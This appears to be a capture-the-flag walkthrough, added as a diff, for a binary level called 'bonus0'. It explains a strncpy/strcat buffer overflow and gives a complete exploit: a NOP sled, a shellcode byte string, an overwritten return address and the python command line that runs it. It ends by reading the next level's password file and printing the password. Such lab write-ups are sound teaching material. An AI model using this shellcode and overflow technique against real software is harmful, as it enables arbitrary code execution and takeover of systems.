@@ -1,0 +1,43 @@
+So we have a binary that ask two string in input and concat them.
+```
+./bonus0
+ - 
+I'm a dog, 
+ - 
+i guess !
+I'm a dog, i guess !
+```
+
+In the source file we can see that the buffer of main is feed with two buffer in pp. Thoses two buffer have a lenth of 20 and are feed in p by a strncpy of 20 bytes form a buffer of 4096. So the null character at the end is not guarented and not present if the buffer of p containe 20 char or more.
+So during the strcpy of pp the copy continue untile the null character.
+The second buffer of pp is declare juste after the first buffer so the overflow in the strcpy copy buff1 and buff2.
+After the strcpy we can fill the main buffer with 40 char.
+Then a space is add and the strcat write again the buff2.
+At this moment the main buffer will be feed with 60 char so more than it size. So we can write in memory in particulary rewrite the save eip.
+First we can try to put a shellcode in the main buffer by the merge of buff1 and buff2:
+ 
+```
+./bonus0 
+ - 
+This is how how i us
+ - 
+e the overflow
+This is how how i use the overflow e the overflow
+```
+but the restore of eip is not very accurate.
+
+so i store the shell code in the buffer of p with a PAD of nop (\x90) and then put the address of the middle buffer in the stored eip
+
+PAD = "\x90" * 100
+SHELLCODE = "\xd9\xee\x9b\xd9\x74\x24\xf4\x5f\x83\xc7\x25\x8d\x77\x08\x31\xc9\xb1\x04\x0f\x6f\x07\x0f\x6f\x0e\x0f\xef\xc1\x0f\x7f\x06\x83\xc6\x08\xe2\xef\xeb\x08\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\x9b\x6a\xfa\xc2\x85\x85\xd9\xc2\xc2\x85\xc8\xc3\xc4\x23\x49\xfa\x23\x48\xf9\x23\x4b\x1a\xa1\x67\x2a"
+PREFIX "A" * 9
+EIP = "\xe1\xe6\xff\xbf" 
+SUFIX "C" * 7
+
+(python -c 'print PAD + SHELLCODE'; python -c 'print PREFIX + EIP + SUFIX'; cat) | ./bonus0
+
+(python -c 'print "\x90" * 100 + "\xd9\xee\x9b\xd9\x74\x24\xf4\x5f\x83\xc7\x25\x8d\x77\x08\x31\xc9\xb1\x04\x0f\x6f\x07\x0f\x6f\x0e\x0f\xef\xc1\x0f\x7f\x06\x83\xc6\x08\xe2\xef\xeb\x08\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\x9b\x6a\xfa\xc2\x85\x85\xd9\xc2\xc2\x85\xc8\xc3\xc4\x23\x49\xfa\x23\x48\xf9\x23\x4b\x1a\xa1\x67\x2a"'; python -c 'print "A" * 9 + "\xe1\xe6\xff\xbf" + "C" * 7'; cat) | ./bonus0
+
+cat /home/user/bonus1/.pass
+cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
+
